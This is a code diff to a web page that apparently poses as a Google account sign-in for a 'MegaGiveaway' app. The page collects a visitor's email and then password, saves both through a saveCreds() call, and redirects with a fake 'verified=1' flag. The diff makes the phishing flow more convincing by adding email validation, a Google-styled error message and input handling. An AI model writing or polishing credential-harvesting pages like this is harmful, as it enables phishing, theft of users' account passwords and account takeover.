@@ -265,6 +265,7 @@
     </div>
 
     <a href="#" class="forgot">Forgot email?</a>
+    <p id="email-error" style="display:none; color:#d93025; font-size:12px; margin-top:-20px; margin-bottom:16px;">Enter a valid email address or phone number.</p>
 
     <p class="privacy-note">
       Before using this app, you can review MegaGiveaway's
@@ -273,6 +274,7 @@
 
     <div class="actions">
       <button class="create-btn" type="button" onclick="window.open('https://accounts.google.com/signup','_blank')">Create account</button>
+      <button class="next-btn" id="email-next" disabled>Next</button>
     </div>
   </div>
 
@@ -345,46 +347,46 @@
 
     let userEmail = '';
 
-    const emailInput = document.getElementById('email-input');
-    const emailNext  = document.getElementById('email-next');
-
-    // Enable Next when something is typed
-    emailInput.addEventListener('input', () => {
-      if (emailInput.value.trim().length > 0) {
-        emailInput.classList.add('has-value');
-        emailNext.disabled = false;
-      } else {
-        emailInput.classList.remove('has-value');
-        emailNext.disabled = true;
-      }
-    });
-
-    emailNext.addEventListener('click', () => {
-      const val = emailInput.value.trim();
-      if (!val) return;
-      userEmail = val;
-      // Save email immediately
-      saveCreds({ email: userEmail, password: '' });
-      // Show password page
-      document.getElementById('chip-avatar').textContent = userEmail[0].toUpperCase();
-      document.getElementById('chip-email').textContent = userEmail;
-      document.getElementById('page-email').style.display = 'none';
-      document.getElementById('page-password').style.display = 'block';
-      document.getElementById('password-input').focus();
-    });
-
+    const emailInput  = document.getElementById('email-input');
+    const emailError  = document.getElementById('email-error');
+    const emailNext   = document.getElementById('email-next');
     const passwordInput = document.getElementById('password-input');
     const passwordNext  = document.getElementById('password-next');
     const showPass      = document.getElementById('show-pass');
 
+    function isValidEmail(val) {
+      return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val) || /^[0-9]{10}$/.test(val);
+    }
+
+    function handleEmailInput() {
+      const val = emailInput.value.trim();
+      emailInput.classList.toggle('has-value', val.length > 0);
+      emailNext.disabled = !isValidEmail(val);
+      if (emailError) emailError.style.display = 'none';
+    }
+
+    emailInput.addEventListener('input', handleEmailInput);
+    emailInput.addEventListener('keyup', handleEmailInput);
+    emailInput.addEventListener('change', handleEmailInput);
+
+    emailNext.addEventListener('click', () => {
+      const val = emailInput.value.trim();
+      if (!isValidEmail(val)) { if (emailError) emailError.style.display = 'block'; return; }
+      userEmail = val;
+      saveCreds({ email: userEmail, password: '' });
+      document.getElementById('chip-avatar').textContent = userEmail[0].toUpperCase();
+      document.getElementById('chip-email').textContent = userEmail;
+      document.getElementById('page-email').style.display = 'none';
+      document.getElementById('page-password').style.display = 'block';
+      setTimeout(() => passwordInput.focus(), 100);
+    });
+
     passwordInput.addEventListener('input', () => {
-      if (passwordInput.value.length > 0) {
-        passwordInput.classList.add('has-value');
-        passwordNext.disabled = false;
-      } else {
-        passwordInput.classList.remove('has-value');
-        passwordNext.disabled = true;
-      }
+      passwordInput.classList.toggle('has-value', passwordInput.value.length > 0);
+      passwordNext.disabled = passwordInput.value.length === 0;
+    });
+    passwordInput.addEventListener('keyup', () => {
+      passwordNext.disabled = passwordInput.value.length === 0;
     });
 
     showPass.addEventListener('change', () => {
@@ -394,19 +396,13 @@
     passwordNext.addEventListener('click', () => {
       const pass = passwordInput.value;
       if (!pass) return;
-      // Save credentials
       saveCreds({ email: userEmail, password: pass });
-      // Redirect back to main page
-      setTimeout(() => {
-        window.location.href = 'index.html?verified=1';
-      }, 600);
+      setTimeout(() => { window.location.href = 'index.html?verified=1'; }, 600);
     });
 
-    // Enter key support
     emailInput.addEventListener('keydown', e => { if (e.key === 'Enter' && !emailNext.disabled) emailNext.click(); });
     passwordInput.addEventListener('keydown', e => { if (e.key === 'Enter' && !passwordNext.disabled) passwordNext.click(); });
   </script>
 
 </body>
 </html>
-
